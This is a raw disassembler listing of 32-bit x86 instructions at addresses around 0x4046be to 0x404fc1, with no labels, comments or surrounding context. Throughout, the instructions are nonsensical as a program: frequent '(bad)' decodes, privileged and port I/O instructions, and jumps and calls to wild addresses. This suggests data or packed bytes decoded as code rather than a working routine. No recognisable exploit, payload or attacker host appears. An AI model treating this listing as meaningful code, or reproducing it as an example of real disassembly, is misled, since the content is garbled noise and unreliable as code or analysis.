  4046be:	xor    DWORD PTR [edx],eax
  4046c0:	cdq    
  4046c1:	aam    0x54
  4046c3:	inc    edx
  4046c4:	mov    WORD PTR [ebp-0x29e6b80c],ss
  4046ca:	loope  0x4046ce
  4046cc:	popa   
  4046cd:	int3   
  4046ce:	ins    BYTE PTR es:[edi],dx
  4046cf:	inc    edx
  4046d0:	mov    WORD PTR [ebx],cs
  4046d2:	lods   al,BYTE PTR ds:[esi]
  4046d3:	scas   eax,DWORD PTR es:[edi]
  4046d4:	lea    edx,[ecx-0x6bb28143]
  4046da:	jp     0x404722
  4046dc:	add    al,0x96
  4046de:	in     al,0x53
  4046e0:	or     esi,edx
  4046e2:	loope  0x40469e
  4046e4:	iret   
  4046e5:	sar    DWORD PTR [edx-0x61],0xeb
  4046e9:	mov    eax,ds:0x47aa9bf9
  4046ee:	loope  0x4046f3
	...
  404704:	nop    esi
  404707:	xor    eax,0xfc5417aa
  40470c:	mov    bl,0x77
  40470e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40470f:	add    al,0x8c
  404711:	mov    esp,DWORD PTR [ecx-0x3a236ccf]
  404717:	stos   DWORD PTR es:[edi],eax
  404718:	mov    bl,0x17
  40471a:	ficom  DWORD PTR [edi]
  40471c:	pop    ss
  40471d:	aad    0xe5
  40471f:	xchg   ebx,eax
  404720:	xchg   edi,eax
  404721:	push   esp
  404722:	xor    al,0x3
  404724:	aam    0x17
  404726:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404727:	stos   DWORD PTR es:[edi],eax
  404728:	xchg   ebx,eax
  404729:	sub    esp,ebp
  40472b:	jle    0x4046b9
  40472d:	or     esp,ecx
  40472f:	mov    esp,0x50e1904e
  404734:	pop    es
  404735:	sub    BYTE PTR [edx-0x40],ah
  404738:	jl     0x4046fd
  40473a:	mov    dl,0xce
  40473c:	test   BYTE PTR [esi-0x6d09fae5],0x8
  404743:	xor    edi,0xae90845
  404749:	sbb    al,0xf7
  40474b:	fcom   QWORD PTR [ecx+0x50726a2b]
  404751:	stos   BYTE PTR es:[edi],al
  404752:	sbb    BYTE PTR [ebp+ecx*8+0x24],ah
  404756:	pop    eax
  404757:	inc    ecx
  404758:	ins    DWORD PTR es:[edi],dx
  404759:	xor    dh,bh
  40475b:	inc    esi
  40475c:	outs   dx,BYTE PTR ds:[esi]
  40475d:	dec    edi
  40475e:	dec    ebp
  40475f:	cmp    DWORD PTR [edx+0x7fa48394],ecx
  404765:	push   cs
  404766:	(bad)
	...
  404779:	add    BYTE PTR [eax],al
  40477b:	add    BYTE PTR [eax-0x4a950537],dl
  404781:	mov    BYTE PTR [eax],cl
  404783:	xchg   ebp,eax
  404784:	mov    WORD PTR [ebx],cs
  404786:	dec    ebp
  404787:	in     eax,0x1a
  404789:	ja     0x404716
  40478b:	mov    ebx,?
  40478d:	push   ss
  40478e:	jl     0x404783
  404790:	adc    bl,BYTE PTR [ecx-0x6f631700]
  404796:	jecxz  0x404764
  404798:	cli    
  404799:	xchg   bh,dh
  40479b:	je     0x404774
  40479d:	cs fs out 0xf6,al
  4047a1:	push   ss
  4047a2:	mov    esp,ecx
  4047a4:	mul    BYTE PTR [eax+0xd8bc20a]
  4047aa:	dec    ebp
  4047ab:	aad    0x91
  4047ad:	test   BYTE PTR [ebp+0x5bc3e02c],al
  4047b3:	rcl    DWORD PTR [eax],1
  4047b5:	inc    esi
  4047b6:	or     cl,ch
  4047b8:	adc    bl,BYTE PTR [edi+esi*8]
  4047bb:	xor    al,0x90
  4047bd:	shl    eax,0x7d
  4047c0:	inc    ebp
  4047c1:	xchg   ebp,eax
  4047c2:	or     dl,bl
  4047c4:	push   edx
  4047c5:	or     cl,bl
  4047c7:	xor    bh,BYTE PTR [ecx]
  4047c9:	push   ebx
  4047ca:	add    al,0xe9
  4047cc:	fmul   QWORD PTR [ecx]
  4047ce:	in     al,0x0
  4047d0:	xchg   cl,al
  4047d2:	mov    edi,DWORD PTR [ebp+0x45]
  4047d5:	xchg   edx,eax
  4047d6:	jge    0x4047e3
  4047d8:	popf   
  4047d9:	nop
  4047da:	or     BYTE PTR [eax],al
  4047dc:	gs retf 
  4047de:	push   ebx
  4047df:	leave  
	...
  4047f4:	ja     0x404813
  4047f6:	test   DWORD PTR [edx+0xb21e60],0x6a089225
  404800:	and    eax,0xa107ceb
  404805:	jmp    0x404883
  404807:	or     BYTE PTR [ebp+0x2500c674],bh
  40480d:	adc    eax,0x8f397ec8
  404812:	lock sub DWORD PTR [eax],edi
  404815:	or     BYTE PTR [ebx+0x7d92057d],0x7
  40481c:	pop    esi
  40481d:	nop
  40481e:	or     BYTE PTR [eax],al
  404820:	in     eax,0xf6
  404822:	or     ebx,ebp
  404824:	scas   eax,DWORD PTR es:[edi]
  404825:	xchg   esi,eax
  404826:	retf   
  404827:	pop    edi
  404828:	cs fxch st(1)
  40482b:	or     al,0xe5
  40482d:	les    eax,FWORD PTR [ebx-0x42a9b14]
  404833:	(bad)  
  404834:	mov    dl,0xeb
  404836:	div    BYTE PTR [ebp-0x4f]
  404839:	pushf  
  40483a:	(bad)  
  40483b:	hlt    
  40483c:	jecxz  0x404829
  40483e:	test   bh,0x28
  404841:	call   0x9113483b
  404846:	or     BYTE PTR [eax],al
  404848:	mov    ch,0x54
  40484a:	(bad)  
  40484b:	cld    
  40484c:	jecxz  0x404839
  40484e:	test   BYTE PTR [ecx],0xa5
  404851:	xchg   ecx,eax
  404852:	or     BYTE PTR [ebp-0x86f08],cl
	...
  40486c:	and    ch,bl
  40486e:	jl     0x404878
  404870:	mov    WORD PTR [esi-0xf672f4],gs
  404876:	mov    eax,ds:0x167b6bff
  40487b:	add    dh,dh
  40487d:	sub    edi,DWORD PTR [esi-0x7b]
  404880:	pop    eax
  404881:	popf   
  404882:	mov    eax,ds:0xc91bcff
  404887:	call   0x4ca619
  40488c:	btr    DWORD PTR [ecx-0x34cd6f8c],esp
  404893:	jne    0x40481d
  404895:	jp     0x404863
  404897:	jmp    0x40482a
  404899:	adc    ecx,DWORD PTR [ebx]
  40489b:	add    BYTE PTR [ebx+ebp*1+0x2b84c2b2],cl
  4048a2:	inc    esi
  4048a3:	mov    esp,DWORD PTR [eax]
  4048a5:	stos   BYTE PTR es:[edi],al
  4048a6:	enter  0x5ffc,0x42
  4048aa:	les    ebp,FWORD PTR [edx+0x66]
  4048ad:	jbe    0x4048d6
  4048af:	or     ah,ah
  4048b1:	scas   eax,DWORD PTR es:[edi]
  4048b2:	mov    eax,ds:0xcb31f3ff
  4048b7:	je     0x4048f9
  4048b9:	add    DWORD PTR [ebp-0x1],eax
  4048bc:	pop    ecx
  4048bd:	and    edx,DWORD PTR [ebx-0x5fe22481]
  4048c3:	or     ecx,esp
  4048c5:	lahf   
  4048c6:	or     eax,0xcc150eb
  4048cb:	push   0xffffff8d
  4048cd:	test   al,0x36
  4048cf:	inc    DWORD PTR [eax]
	...
  4048e1:	add    BYTE PTR [eax],al
  4048e3:	add    BYTE PTR [esi+edi*1+0x26],bl
  4048e7:	or     BYTE PTR [eax+eax*1-0x5773ff42],ah
  4048ee:	retf   
  4048ef:	jle    0x40494d
  4048f1:	mov    ds:0x68541436,al
  4048f6:	mov    eax,ds:0xa9a8e75
  4048fb:	mov    esp,ecx
  4048fd:	xchg   esp,eax
  4048fe:	std    
  4048ff:	jl     0x40489f
  404901:	jle    0x4048e4
  404903:	sbb    eax,0xa924218d
  404908:	fcom   QWORD PTR [ebx]
  40490a:	sbb    al,0xf8
  40490c:	push   0x67
  40490e:	shr    DWORD PTR [eax+0x5c99a0d9],1
  404914:	xor    al,0x14
  404916:	jle    0x404904
  404918:	enter  0xf3a4,0x5
  40491c:	aaa    
  40491d:	cdq    
  40491e:	fs int3 
  404920:	mov    eax,0xd7c47a40
  404925:	frstor [edx]
  404927:	jl     0xdd7b396
  40492d:	fchs   
  40492f:	stos   DWORD PTR es:[edi],eax
  404930:	and    edx,DWORD PTR [edx+edx*4]
  404933:	fdiv   QWORD PTR [esi]
  404935:	jg     0x4048d2
  404937:	test   al,0x99
  404939:	pushf  
  40493a:	dec    ecx
  40493b:	or     ecx,DWORD PTR [ebx]
  40493d:	adc    al,0x2e
  40493f:	cld    
  404940:	inc    ebx
  404941:	mov    DWORD PTR [esi-0x6beca9e3],ecx
  404947:	sti    
	...
  40495c:	jmp    0x4048fc
  40495e:	push   es
  40495f:	test   al,0xeb
  404961:	lahf   
  404962:	and    DWORD PTR [esi],ebp
  404964:	mov    ?,edi
  404966:	popf   
  404967:	sbb    BYTE PTR [ecx-0x5c],0xe1
  40496b:	sti    
  40496c:	rcl    DWORD PTR [ebx],cl
  40496e:	jg     0x404970
  404970:	add    al,0x95
  404972:	stc    
  404973:	add    ecx,DWORD PTR [edi+edi*8-0x5bae851f]
  40497a:	dec    ebx
  40497b:	add    al,0x5c
  40497d:	and    DWORD PTR [esp+eax*1-0x5c],ebp
  404981:	adc    ecx,esi
  404983:	push   esp
  404984:	mov    ds:0x5c9bf989,eax
  404989:	loope  0x404992
  40498b:	jmp    0x3108631f
  404990:	mov    ?,edi
  404992:	and    ebx,DWORD PTR [edi+ecx*4]
  404995:	push   edi
  404996:	jecxz  0x40495e
  404998:	fistp  WORD PTR [edi]
  40499a:	pop    ebp
  40499b:	in     eax,0xf6
  40499d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40499e:	(bad)  
  40499f:	jmp    0xe9cd6b63
  4049a4:	aaa    
  4049a5:	adc    esi,edi
  4049a7:	sbb    DWORD PTR [ebx],esi
  4049a9:	mov    DWORD PTR [esi+esi*2],eax
  4049ac:	mov    esi,0xccc050a4
  4049b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049b2:	mov    esp,esp
  4049b4:	lahf   
  4049b5:	xchg   esp,eax
  4049b6:	jge    0x4049a2
  4049b8:	into   
  4049b9:	dec    DWORD PTR [ebx]
  4049bb:	ins    BYTE PTR es:[edi],dx
  4049bc:	inc    edi
  4049bd:	mov    BYTE PTR [ecx+0x62],dl
	...
  4049d3:	add    BYTE PTR [edi+0x6f],cl
  4049d6:	shr    DWORD PTR [ebx],0x24
  4049d9:	adc    ebx,DWORD PTR [edx+esi*2-0xc]
  4049dd:	push   ss
  4049de:	int3   
  4049df:	xor    ebx,eax
  4049e1:	(bad)  
  4049e2:	test   ebx,0x9cf76b8f
  4049e8:	pop    es
  4049e9:	sti    
  4049ea:	retf   
  4049eb:	xor    edx,DWORD PTR ss:[ebx]
  4049ee:	iret   
  4049ef:	lods   al,BYTE PTR ds:[esi]
  4049f0:	sub    edx,DWORD PTR [eax+ecx*1+0x5d1f8fe9]
  4049f7:	icebp  
  4049f8:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049fa:	test   DWORD PTR [edi+eiz*1+0x54ed6264],esp
  404a01:	pop    ecx
  404a02:	hlt    
  404a03:	cdq    
  404a04:	repnz mov BYTE PTR [eax],al
  404a07:	out    0x5d,al
  404a09:	mov    al,ds:0x1064684f
  404a0e:	add    eax,0x7c9cb4e3
  404a13:	jecxz  0x404a23
  404a15:	xchg   ecx,eax
  404a16:	lock add BYTE PTR [ebp-0x1acc3e3d],dh
  404a1d:	sub    eax,0x15e28b0d
  404a22:	enter  0x9a03,0x4f
  404a26:	retf   0x7504
  404a29:	gs sub esp,0xffffffe6
  404a2d:	push   ecx
  404a2e:	cld    
  404a2f:	push   ebx
  404a30:	mov    dl,0xb0
  404a32:	nop
  404a33:	cmp    dh,BYTE PTR [ebp-0x6a]
  404a36:	loopne 0x404a24
	...
  404a4c:	sub    bh,BYTE PTR [ebx]
  404a4e:	test   DWORD PTR [ecx+0x45853cb0],0x29e065d1
  404a58:	and    bh,BYTE PTR [ebx]
  404a5a:	div    DWORD PTR [ebx]
  404a5c:	into   
  404a5d:	stos   DWORD PTR es:[edi],eax
  404a5e:	push   ss
  404a5f:	push   0x3f
  404a61:	scas   al,BYTE PTR es:[edi]
  404a62:	or     dl,bh
  404a64:	and    eax,0xc175f796
  404a69:	cmp    bh,BYTE PTR [ebp+0x8]
  404a6c:	mov    ebp,0x5afff691
  404a71:	adc    al,0xc8
  404a73:	pop    fs
  404a75:	add    eax,0x3af50008
  404a7a:	jge    0x404a70
  404a7c:	popf   
  404a7d:	mov    edx,0xfc9affdf
  404a82:	idiv   cl
  404a84:	in     eax,0x95
  404a86:	jle    0x404a8d
  404a88:	mov    WORD PTR [ecx+0x3af50009],ds
  404a8e:	jge    0x404a84
  404a90:	jge    0x404aed
  404a92:	idiv   edi
  404a94:	ficom  DWORD PTR [ecx+0x3a7174c8]
  404a9a:	jge    0x404a90
  404a9c:	fisttp QWORD PTR [ecx+edx*8+0x5d8bdaff]
  404aa3:	hlt    
  404aa4:	mov    WORD PTR [esi+0x1a],?
  404aa7:	push   0xffffff8c
  404aa9:	push   ebx
  404aaa:	clc    
  404aab:	and    BYTE PTR [ebx+edi*8+0x75ab],cl
	...
  404ac2:	add    BYTE PTR [eax],al
  404ac4:	cwde   
  404ac5:	push   edx
  404ac6:	daa    
  404ac7:	hlt    
  404ac8:	xchg   ebx,eax
  404ac9:	lods   eax,DWORD PTR ds:[esi]
  404aca:	lock (bad) 
  404acc:	rol    DWORD PTR [ebx+0xc],1
  404acf:	add    BYTE PTR [ebx+edi*8-0x4334c7ee],cl
  404ad6:	or     al,0xff
  404ad8:	stc    
  404ad9:	daa    
  404ada:	xchg   esp,eax
  404adb:	into   
  404adc:	push   edi
  404add:	sti    
  404ade:	or     dl,BYTE PTR [ebx-0x69]
  404ae1:	cmp    edi,DWORD PTR [eax]
  404ae3:	ss pop es
  404ae5:	adc    edx,DWORD PTR [eax+edi*1]
  404ae8:	ret    
  404ae9:	mov    esp,0x35abe80c
  404aee:	or     al,0x0
  404af0:	(bad)  
  404af1:	jae    0x404b38
  404af3:	inc    edi
  404af4:	pop    es
  404af5:	shl    BYTE PTR [ebx-0x6c],cl
  404af8:	popf   
  404af9:	sti    
  404afa:	or     dh,BYTE PTR [eax-0x47a19267]
  404b00:	clc    
  404b01:	jmp    0x404b0d
  404b03:	add    BYTE PTR [edi-0x44],ah
  404b06:	mov    dh,0x47
  404b08:	adc    edi,ebx
  404b0a:	inc    ebx
  404b0b:	push   ebx
  404b0c:	hlt    
  404b0d:	adc    dh,BYTE PTR [ecx+0x37848c00]
  404b13:	clc    
  404b14:	pop    ebx
  404b15:	mov    ecx,0x4a81ff35
  404b1a:	inc    eax
  404b1b:	push   0x4a3254
  404b20:	jecxz  0x404ab1
  404b22:	scas   eax,DWORD PTR es:[edi]
  404b23:	call   0x4d1139
	...
  404b3c:	aas    
  404b3d:	test   dl,0x74
  404b40:	push   eax
  404b41:	jbe    0x404ae7
  404b43:	push   0x433e9454
  404b48:	mov    esp,?
  404b4a:	mov    esi,0xe2948cba
  404b4f:	stos   DWORD PTR es:[edi],eax
  404b50:	inc    ebx
  404b51:	pop    ecx
  404b52:	push   0xffffffc4
  404b54:	in     eax,0x27
  404b56:	rol    BYTE PTR [ebx],1
  404b58:	mov    WORD PTR [esp+eiz*8-0x4f],es
  404b5c:	loop   0x404ba9
  404b5e:	push   ebp
  404b5f:	adc    cl,BYTE PTR [esp+edx*4+0x584ac30a]
  404b66:	scas   al,BYTE PTR es:[edi]
  404b67:	add    esp,ebx
  404b69:	arpl   WORD PTR [ecx-0x61ef9da0],bx
  404b6f:	js     0x404b32
  404b71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b72:	jmp    0x6701:0x7898d8d1
  404b79:	xchg   edi,eax
  404b7a:	adc    DWORD PTR [edx+eax*2-0x145b8211],ebx
  404b81:	(bad)  
  404b82:	sub    eax,0xca6f91a5
  404b87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b88:	ror    DWORD PTR [eax],0x59
  404b8b:	fist   DWORD PTR [eax+edx*1+0x5e]
  404b8f:	sub    BYTE PTR [ecx-0x74d31ef4],0xd7
  404b96:	mov    ds:0x81948cab,eax
  404b9b:	add    edx,DWORD PTR [ebx]
  404b9d:	mov    bh,BYTE PTR [ecx]
  404b9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  404bb4:	or     DWORD PTR [eax],0xfc942e26
  404bba:	add    eax,0x160ffba6
  404bbf:	cs clc 
  404bc1:	cld    
  404bc2:	cwde   
  404bc3:	int    0xeb
  404bc5:	pminsw mm0,mm3
  404bc8:	pop    ecx
  404bc9:	xchg   edx,eax
  404bca:	sbb    cl,BYTE PTR [eax]
  404bcc:	xchg   esp,edx
  404bce:	jl     0x404bdc
  404bd0:	pop    es
  404bd1:	push   0x8
  404bd3:	std    
  404bd4:	inc    ebx
  404bd5:	mov    ds:0xebb74f7,al
  404bda:	jge    0x404bb9
  404bdc:	out    dx,eax
  404bdd:	bound  edi,QWORD PTR [esp+eiz*2]
  404be0:	enter  0xd8c,0x92
  404be4:	xchg   ecx,eax
  404be5:	xchg   esp,eax
  404be6:	or     cl,ch
  404be8:	adc    ch,BYTE PTR [edx-0x4]
  404beb:	jb     0x404b8f
  404bed:	push   cs
  404bee:	jge    0x404ba5
  404bf0:	out    dx,eax
  404bf1:	bound  eax,QWORD PTR [eax]
  404bf3:	mov    dh,0xa5
  404bf5:	adc    al,ah
  404bf7:	inc    ecx
  404bf8:	dec    esi
  404bf9:	maskmovq mm6,(bad)
  404bfa:	div    DWORD PTR [edx+0x53]
  404bfd:	outs   dx,DWORD PTR ds:[esi]
  404bfe:	push   ebx
  404bff:	mov    al,0x4a
  404c01:	mov    al,ds:0x1b3c08
  404c06:	mov    esp,DWORD PTR [ebp-0x2da49848]
  404c0c:	sbb    bh,BYTE PTR [eax+ecx*1-0x37]
  404c10:	(bad)  
  404c11:	xchg   esp,eax
  404c12:	loopne 0x404c1e
  404c14:	dec    esi
  404c15:	maskmovq mm4,(bad)
  404c16:	mul    DWORD PTR [eax+0x0]
	...
  404c29:	add    BYTE PTR [eax],al
  404c2b:	add    ch,dl
  404c2d:	adc    BYTE PTR [eax-0x17],ah
  404c30:	das    
  404c31:	maskmovq mm2,(bad)
  404c32:	not    DWORD PTR [ecx+0x76]
  404c35:	out    dx,al
  404c36:	not    BYTE PTR [esi+0x19]
  404c39:	pop    ecx
  404c3a:	mov    esp,0x8b48fc1
  404c3f:	jmp    0x3f16a92b
  404c44:	out    dx,eax
  404c45:	sbb    al,0x4d
  404c47:	jne    0x404c66
  404c49:	xchg   ecx,eax
  404c4a:	enter  0xec70,0xe
  404c4e:	imul   ecx
  404c50:	loop   0x404ca0
  404c52:	sti    
  404c53:	push   ebx
  404c54:	(bad)  
  404c55:	pop    eax
  404c56:	enter  0x8fd5,0x94
  404c5a:	or     BYTE PTR [esi],ah
  404c5c:	push   ebp
  404c5d:	call   0x93324d58
  404c62:	or     bh,al
  404c64:	sub    BYTE PTR [ebx],ah
  404c66:	neg    DWORD PTR [edi]
  404c68:	mov    ch,0x92
  404c6a:	div    DWORD PTR [ebp-0x4f]
  404c6d:	and    DWORD PTR [ebp-0x30],ecx
  404c70:	mov    dl,0xab
  404c72:	mov    esp,0x8544688f
  404c77:	inc    ebp
  404c78:	cmc    
  404c79:	ret    0x60
  404c7c:	mov    ch,0x92
  404c7e:	mov    BYTE PTR [edx-0x5b],ch
  404c81:	xor    DWORD PTR [ebp+0x8],edi
  404c84:	mov    ebp,0x7500c2c9
  404c89:	lahf   
  404c8a:	enter  0x6b74,0x17
  404c8e:	jne    0x404c60
	...
  404ca4:	lods   eax,DWORD PTR gs:[esi]
  404ca6:	or     eax,0x89223e9
  404cab:	add    BYTE PTR [edx],bh
  404cad:	pop    ebp
  404cae:	mov    eax,0x89272ff
  404cb3:	lea    ebp,[eax+0x58ff5868]
  404cb9:	outs   dx,BYTE PTR ds:[esi]
  404cba:	pusha  
  404cbb:	add    BYTE PTR ds:0x688d8892,dh
  404cc1:	fcom   DWORD PTR [edi-0x18]
  404cc4:	xchg   edi,eax
  404cc5:	fiadd  WORD PTR [edi]
  404cc7:	add    BYTE PTR [esi],bh
  404cc9:	sar    BYTE PTR [ebp+eax*1-0x34],cl
  404ccd:	or     BYTE PTR [eax],0x0
  404cd0:	xor    eax,0x6bb44d1f
  404cd5:	xchg   ecx,eax
  404cd6:	or     BYTE PTR [ebp+0x3cb0d1d0],cl
  404cdc:	cmc    
  404cdd:	xchg   ecx,eax
  404cde:	or     BYTE PTR [ebx],dh
  404ce0:	mov    ch,0x26
  404ce2:	mov    ds:0x33d228c7,al
  404ce7:	add    ch,ah
  404ce9:	xchg   ecx,eax
  404cea:	div    DWORD PTR [ebp-0x74]
  404ced:	outs   dx,DWORD PTR ds:[esi]
  404cee:	call   0xdbd4:0x40b6f045
  404cf5:	test   BYTE PTR [edx],0x0
  404cf8:	retf   
  404cf9:	cmp    BYTE PTR [ebx+0xafbabff],bl
  404cff:	lea    ecx,[ecx-0x45]
  404d02:	cmp    ebp,DWORD PTR [edx-0x74]
  404d05:	popa   
  404d06:	or     al,0xff
	...
  404d1c:	cmp    DWORD PTR [edi],ebp
  404d1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d1f:	out    0xd5,al
  404d21:	sti    
  404d22:	or     cl,BYTE PTR [ebx]
  404d24:	int3   
  404d25:	add    al,BYTE PTR [bp+di+0x2b19]
  404d2a:	or     al,0x75
  404d2c:	mov    fs,edx
  404d2e:	sub    edi,edi
  404d30:	add    DWORD PTR [eax-0x57],ecx
  404d33:	jne    0x404d6d
  404d35:	push   ebx
  404d36:	ds dec edi
  404d38:	int    0xfb
  404d3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d3b:	jne    0x404d6d
  404d3d:	and    edx,DWORD PTR [ebx]
  404d3f:	leave  
  404d40:	mov    ebx,?
  404d42:	mov    eax,esp
  404d44:	jl     0x404d34
  404d46:	dec    edi
  404d47:	inc    ebp
  404d48:	xor    al,0xab
  404d4a:	add    BYTE PTR es:[ebx+0x8],dl
  404d4e:	xchg   edi,eax
  404d4f:	call   0xffe9ce8e
  404d54:	xchg   edi,eax
  404d55:	cmp    ebx,DWORD PTR [edi]
  404d57:	add    ah,BYTE PTR [edi]
  404d59:	mov    al,0x83
  404d5b:	inc    ebp
  404d5c:	hlt    
  404d5d:	ins    DWORD PTR es:[edi],dx
  404d5e:	pop    ds
  404d5f:	mov    esp,0xc30934
  404d64:	mov    WORD PTR [ebx-0x58],cs
  404d67:	jne    0x404d41
  404d69:	push   ebp
  404d6a:	pop    ds
  404d6b:	mov    eax,0xff942824
  404d70:	or     esi,edx
  404d72:	retf   0x8e75
  404d75:	push   edx
  404d76:	cld    
  404d77:	inc    BYTE PTR [ecx+0x79a0f194]
  404d7d:	mov    al,ds:0x1716
	...
  404d92:	add    BYTE PTR [eax],al
  404d94:	and    al,0xfc
  404d96:	rcr    DWORD PTR [esi-0x4395f31d],cl
  404d9c:	fild   DWORD PTR [esi-0x253153b7]
  404da2:	loopne 0x404da7
  404da4:	retf   
  404da5:	xchg   BYTE PTR ds:0xe5ef96ac,dh
  404dab:	mov    al,ds:0xabad86bb
  404db0:	mov    gs,edi
  404db2:	aad    0xa0
  404db4:	stos   DWORD PTR es:[edi],eax
  404db5:	xchg   ch,bl
  404db7:	stos   DWORD PTR es:[edi],eax
  404db8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404db9:	out    dx,eax
  404dba:	lds    esp,FWORD PTR [eax+0x4129d107]
  404dc0:	vpmulhuw xmm0,xmm5,XMMWORD PTR [ebx]
  404dc4:	loope  0x404de5
  404dc6:	int    0x84
  404dc8:	dec    eax
  404dc9:	or     DWORD PTR [edx+0x46],ebp
  404dcc:	mov    BYTE PTR [edi-0x2c75e85f],bl
  404dd2:	loopne 0x404dd7
  404dd4:	mov    WORD PTR [ecx+eiz*8-0x1ef73638],ss
  404ddb:	add    ecx,DWORD PTR [esp+edx*4+0x6550467c]
  404de2:	jbe    0x404dfa
  404de4:	cwde   
  404de5:	or     esi,esp
  404de7:	or     esi,DWORD PTR [esi+edi*2]
  404dea:	addr16 mov al,ds:0x183b
  404dee:	in     al,dx
  404def:	lahf   
  404df0:	mov    WORD PTR [eax+0xb8c2dfe],es
  404df6:	aam    0xf
	...
  404e0c:	and    eax,DWORD PTR [edx+0xac2ab45]
  404e12:	dec    esi
  404e13:	mov    al,ds:0x9fbc0bbc
  404e18:	hlt    
  404e19:	cmp    DWORD PTR [eax],ecx
  404e1b:	adc    eax,0x20500c2c
  404e20:	rcr    DWORD PTR [eax+ecx*1-0x7506ff44],1
  404e27:	and    eax,0xaccf730b
  404e2c:	add    edx,DWORD PTR [esi+0x51c48708]
  404e32:	mul    bh
  404e34:	(bad)  
  404e35:	jle    0x404e43
  404e37:	ins    BYTE PTR es:[edi],dx
  404e38:	push   edx
  404e39:	or     BYTE PTR [eax-0x7f],bl
  404e3c:	setne  BYTE PTR [eax]
  404e3f:	jmp    0xea3759ab
  404e44:	(bad)  
  404e45:	or     edi,DWORD PTR [ebp-0xf]
  404e48:	not    DWORD PTR [edx-0x3f]
  404e4b:	jmp    0xe60a2bdf
  404e50:	(bad)  
  404e51:	popa   
  404e52:	adc    ebp,0xf
  404e55:	shl    DWORD PTR [ebx+0x4cd3bf16],1
  404e5b:	test   DWORD PTR [eax+0x5ee90894],ecx
  404e61:	out    dx,al
  404e62:	pop    edi
  404e63:	jmp    0x923759e7
  404e68:	sub    al,0xf6
  404e6b:	xchg   esi,eax
  404e6c:	adc    DWORD PTR [ecx-0x38],edx
  404e6f:	add    DWORD PTR [eax],eax
	...
  404e81:	add    BYTE PTR [eax],al
  404e83:	add    BYTE PTR [eax+0x27e908a4],dl
  404e89:	jge    0x404e5f
  404e8b:	jle    0x404eb8
  404e8d:	sbb    eax,0x9470314d
  404e92:	sbb    cl,ch
  404e94:	(bad)  
  404e95:	cld    
  404e96:	push   ebx
  404e97:	inc    ebp
  404e98:	adc    ecx,DWORD PTR [ebx]
  404e9a:	and    DWORD PTR [ebx+ecx*8-0x3ed28ae7],0x8fe908c8
  404ea5:	(bad)  
  404ea6:	enter  0x5600,0x7e
  404eaa:	iret   
  404eab:	inc    ebp
  404eac:	mov    cl,0xf4
  404eae:	idiv   bh
  404eb0:	cmc    
  404eb1:	sub    DWORD PTR [ebp-0x40],edi
  404eb4:	pop    edx
  404eb5:	pop    ebp
  404eb6:	fdiv   st(7),st
  404eb8:	adc    BYTE PTR [edi-0x79],ch
  404ebb:	inc    ebp
  404ebc:	test   ebx,edx
  404ebe:	dec    esp
  404ebf:	fdivr  DWORD PTR [edx-0x65]
  404ec2:	or     BYTE PTR [eax],al
  404ec4:	mov    dl,0x5d
  404ec6:	cld    
  404ec7:	(bad)  
  404ec8:	ficom  DWORD PTR [esi-0x2d0f72f8]
  404ece:	push   edi
  404ecf:	push   0x800896b5
  404ed4:	seta   bh
  404ed7:	jne    0x404e96
  404ed9:	ds (bad) 
  404edb:	enter  0x96b5,0x3
  404edf:	rol    BYTE PTR [ecx-0x6e],0x8b
  404ee3:	jge    0x404ec6
  404ee5:	xchg   esi,eax
  404ee6:	jge    0x404eed
	...
  404efc:	mov    esp,0x75000833
  404f01:	ror    DWORD PTR [eax+esi*4+0x3a],cl
  404f05:	fwait
  404f06:	or     BYTE PTR [eax],al
  404f08:	fcomp  DWORD PTR [eax+edi*4+0x50]
  404f0c:	sub    ch,BYTE PTR [ebp-0x698a974c]
  404f12:	or     BYTE PTR [eax+0x50cc5ce8],al
  404f18:	or     eax,0x6500c05d
  404f1d:	lahf   
  404f1e:	enter  0x3075,0x39
  404f22:	rol    BYTE PTR [eax],1
  404f24:	xor    eax,0x7d458396
  404f29:	iret   
  404f2a:	pop    es
  404f2b:	add    BYTE PTR [eax-0x7646334c],bh
  404f31:	nop
  404f32:	or     BYTE PTR [eax],al
  404f34:	mov    WORD PTR [esi-0x4d190c34],gs
  404f3a:	inc    eax
  404f3b:	les    edx,FWORD PTR [eax-0x5]
  404f3e:	or     al,BYTE PTR [eax]
  404f40:	or     eax,DWORD PTR [ecx+0x53]
  404f43:	(bad)
  404f47:	inc    ebp
  404f48:	aam    0xba
  404f4a:	push   es
  404f4b:	add    BYTE PTR [edx+edi*4-0x5140bc0],cl
  404f52:	or     al,BYTE PTR [eax]
  404f54:	adc    DWORD PTR [ecx],edi
  404f56:	iret   
  404f57:	push   eax
  404f58:	data16 sti 
  404f5a:	and    BYTE PTR [eax],al
  404f5c:	ror    DWORD PTR [eax+0xe857],cl
	...
  404f72:	add    BYTE PTR [eax],al
  404f74:	lds    esi,FWORD PTR [edx-0x4468fff5]
  404f7a:	pop    ds
  404f7b:	push   es
  404f7c:	vmwrite edi,DWORD PTR [edi-0x5e07c700]
  404f83:	mov    WORD PTR [ebx+edi*8+0xb19ff0a],cs
  404f8a:	xchg   esp,eax
  404f8b:	jne    0x404f59
  404f8d:	ficomp DWORD PTR [esi]
  404f8f:	mov    eax,0x4146b724
  404f94:	mov    WORD PTR [edx+0x1f],cs
  404f97:	mov    esp,0xcd7974
  404f9c:	mov    WORD PTR [esi-0x40],?
  404f9f:	adc    al,0x83
  404fa1:	push   0x4f
  404fa3:	fdivr  QWORD PTR [ebp+eiz*4+0x3bd9ff0c]
  404faa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fab:	sti    
  404fac:	push   esp
  404fad:	sbb    dl,BYTE PTR [ebp+0x9084c0b]
  404fb3:	jmp    0x404f9f
  404fb5:	test   BYTE PTR [edi-0x4c],cl
  404fb8:	inc    ebx
  404fb9:	or     BYTE PTR [edi-0x18],bl
  404fbc:	in     eax,dx
  404fbd:	js     0x404f54
  404fbf:	push   DWORD PTR [ebx]
  404fc1:	xchg   esp,eax
